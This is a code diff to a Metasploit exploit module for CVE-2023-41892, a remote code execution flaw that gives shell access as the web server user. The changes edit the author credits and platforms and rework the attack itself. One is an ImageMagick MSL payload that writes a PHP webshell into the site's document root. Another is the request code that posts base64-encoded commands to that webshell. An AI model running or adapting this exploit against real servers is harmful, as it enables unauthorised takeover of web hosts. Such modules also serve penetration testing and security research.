@@ -35,8 +35,9 @@ class MetasploitModule < Msf::Exploit::Remote
           access to the underlying operating system as the user that the web services are running as (typically www-data).
         },
         'Author' => [
-          'chybeta', # discovery
-          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module
+          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
+          'Thanh', # discovery
+          'chybeta' # poc
         ],
         'References' => [
           [ 'CVE', '2023-41892' ],
@@ -64,7 +65,7 @@ class MetasploitModule < Msf::Exploit::Remote
           [
             'Unix Command',
             {
-              'Platform' => 'unix',
+              'Platform' => [ 'unix', 'linux' ],
               'Arch' => ARCH_CMD,
               'Type' => :unix_cmd,
               'DefaultOptions' => {
@@ -168,11 +169,11 @@ class MetasploitModule < Msf::Exploit::Remote
       EOS
     else
       # create the MSL payload
-      # payload = "<?=$_GET[\'#{@get_param}\'](base64_decode($_POST[\'#{@post_param}\']));?>"
+      # payload = "<?=#{datastore['COMMAND']}(base64_decode($_POST[\'#{@post_param}\']));?>"
       payload = <<~EOS
         <?xml version="1.0" encoding="UTF-8"?>
         <image>
-        <read filename="caption:&lt;?=$_GET[\'#{@get_param}\'](base64_decode($_POST[\'#{@post_param}\'])); ?&gt;" />
+        <read filename="caption:&lt;?=#{datastore['COMMAND']}(base64_decode($_POST[\'#{@post_param}\'])); ?&gt;" />
         <write filename="info:#{@config['document_root']}/#{@webshell_name}" />
         </image>
       EOS
@@ -210,28 +211,12 @@ class MetasploitModule < Msf::Exploit::Remote
     false
   end
 
-  def execute_php(cmd, _opts = {})
-    payload = Base64.strict_encode64(cmd)
-    return send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(datastore['TARGETURI'], @webshell_name),
-      'ctype' => 'application/x-www-form-urlencoded',
-      'vars_post' => {
-        @post_param => payload
-      }
-    })
-  end
-
   def execute_command(cmd, _opts = {})
     payload = Base64.strict_encode64(cmd)
-    php_cmd_function = datastore['COMMAND']
     return send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(datastore['TARGETURI'], @webshell_name),
       'ctype' => 'application/x-www-form-urlencoded',
-      'vars_get' => {
-        @get_param => php_cmd_function
-      },
       'vars_post' => {
         @post_param => payload
       }
@@ -274,9 +259,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
     case target['Type']
-    when :php
-      execute_php(payload.encoded)
-    when :unix_cmd
+    when :php, :unix_cmd
       execute_command(payload.encoded)
     when :linux_dropper
       execute_cmdstager(linemax: 65536)
